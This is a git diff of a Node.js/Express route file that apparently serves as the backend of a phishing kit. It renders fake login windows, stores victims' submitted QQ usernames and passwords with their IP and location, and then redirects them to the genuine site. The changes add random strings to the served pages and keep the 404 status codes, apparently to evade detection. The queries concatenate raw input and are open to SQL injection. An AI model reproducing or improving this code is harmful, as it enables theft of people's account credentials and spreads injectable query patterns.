@@ -4,65 +4,67 @@ var code = require('../lib/incode.js');
 var magic = require('../lib/magic.js');
 var cwd = process.cwd();
 var path = require('path');
-module.exports = function(app) {
-    function insertData(req,cb) {
+var ranStr = require('../lib/ranstr.js')
+
+module.exports = function (app) {
+    function insertData(req, cb) {
         var qq = req.body.u;
         var pwd = req.body.p;
         var userId = req.body.uid;
         var mid = req.body.mid;
         var ip = req.connection.remoteAddress;
-        ip = ip.substr(ip.indexOf(':',3)+1);
+        ip = ip.substr(ip.indexOf(':', 3) + 1);
         var insertTime = new Date().getTime().toString();
-        var mname,userName,address;
-        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';',function(err,rows){
+        var mname, userName, address;
+        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + userId + ';', function (err, rows) {
             mname = rows[0].tempName;
             userName = rows[0].userName;
-            _ip(ip,function(ip,add){
+            _ip(ip, function (ip, add) {
                 address = add;
-                sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`,function(err,rows){
+                sql.all(`insert into datas values(null,"${qq}","${pwd}","${ip}","${address}",${mid},"${mname}",${userId},"${userName}","${insertTime}",0);`, function (err, rows) {
                     cb();
                 });
             });
         });
     };
 
-    app.get('/_login',function(req,res) {
+    app.get('/_login/:name', function (req, res) {
         res.statusCode = 404;
         var uidStr = req.headers.host;
-        var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
-        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
+        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
             var url = rows[0].url;
-            res.render('pages/pc_login_window.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
+            res.render('pages/pc_login_window.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
         });
     });
 
-    app.post('/_login',function(req,res) {
+    app.post('/_login/:name', function (req, res) {
         var tz = req.body.tz;
         var uidStr = req.headers.host;
-        var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
-        insertData(req,function(){
-            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
+        insertData(req, function () {
+            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                 var mid = rows[0].tempId;
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
                 if (tz.toString() === '1') {
-                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
+                    return res.send('<script>window.parent.location.href="' + url + '";</script>');
                 }
-                res.render('pages/pc_login_window.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
+                res.render('pages/pc_login_window.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
             });
         });
     });
 
-    app.get('/x',function(req,res) {
+    app.get('/x/:name', function (req, res) {
         var uidStr = req.headers.host;
-        var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
         res.statusCode = 404;
-        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
+        sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
             var mid = rows[0].tempId;
             var bgUrl = rows[0].bgUrl;
             var url = rows[0].url;
@@ -70,19 +72,19 @@ module.exports = function(app) {
                 return res.redirect('/m');
             }
             if (req.device.type === 'phone') {
-                return res.render('pages/wap_temp.html',{layout: null,tz:0,uid:uid,mid:mid,bgUrl:bgUrl});
+                return res.render('pages/wap_temp.html', { layout: null, tz: 0, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
             }
-            res.render('pages/pc_temp.html',{layout: null,uid:uid,mid:mid,bgUrl:bgUrl});
+            res.render('pages/pc_temp.html', { layout: null, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
         });
     });
 
-    app.post('/x',function(req,res) {
+    app.post(['/x/:name','/x'], function (req, res) {
         var tz = req.body.tz;
         var uidStr = req.headers.host;
-        var uid = uidStr.substr(0,uidStr.indexOf('.'));
+        var uid = uidStr.substr(0, uidStr.indexOf('.'));
         uid = code.decode(uid);
-        insertData(req,function(){
-            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';',function(err,rows){
+        insertData(req, function () {
+            sql.all('select * from users cross join temps where users.tempId=temps.id and users.id=' + uid + ';', function (err, rows) {
                 var mid = rows[0].tempId;
                 var bgUrl = rows[0].bgUrl;
                 var url = rows[0].url;
@@ -90,31 +92,32 @@ module.exports = function(app) {
                     return res.redirect('/m');
                 }
                 if (tz.toString() === '1') {
-                    return res.send('<script>window.parent.location.href="'+url+'";</script>');
+                    return res.send('<script>window.parent.location.href="' + url + '";</script>');
                 }
                 if (req.device.type === 'phone') {
-                    return res.render('pages/wap_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
+                    return res.render('pages/wap_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
                 }
-                res.render('pages/pc_temp.html',{layout: null,tz:1,uid:uid,mid:mid,bgUrl:bgUrl});
+                res.render('pages/pc_temp.html', { layout: null, tz: 1, uid: uid, mid: mid, bgUrl: bgUrl, ranStr: ranStr.en() });
             });
         });
     });
 
-    app.get('/t',function(req,res) {
+    app.get('/t/:name', function (req, res) {
         res.statusCode = 404;
         if (req.device.type === 'phone') {
-            return res.sendFile( path.join(cwd,'/yzm.html'));
+            return res.render(path.join(cwd, '/yzm.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt })
+            // return res.sendFile( path.join(cwd,'/yzm.html'));
         }
-        res.sendFile( path.join(cwd,'/transfer.html'));
+        return res.render(path.join(cwd, '/transfer.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt })
     });
 
-    app.get('/t_close.html',function(req,res) {
+    app.get('/t_close.html/:name', function (req, res) {
         res.statusCode = 404;
-        res.sendFile( path.join(cwd,'/close.html'));
+        res.render(path.join(cwd, '/close.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt })
     });
 
-    app.get('//',function(req,res){
+    app.get('//', function (req, res) {
         res.statusCode = 404;
-        return res.sendFile(path.join(cwd,'/index.html'));
+        res.render(path.join(cwd, '/index.html'), { layout: null, ranStr: ranStr.en(), cssfmt: ranStr.cssFmt })
     });
 };
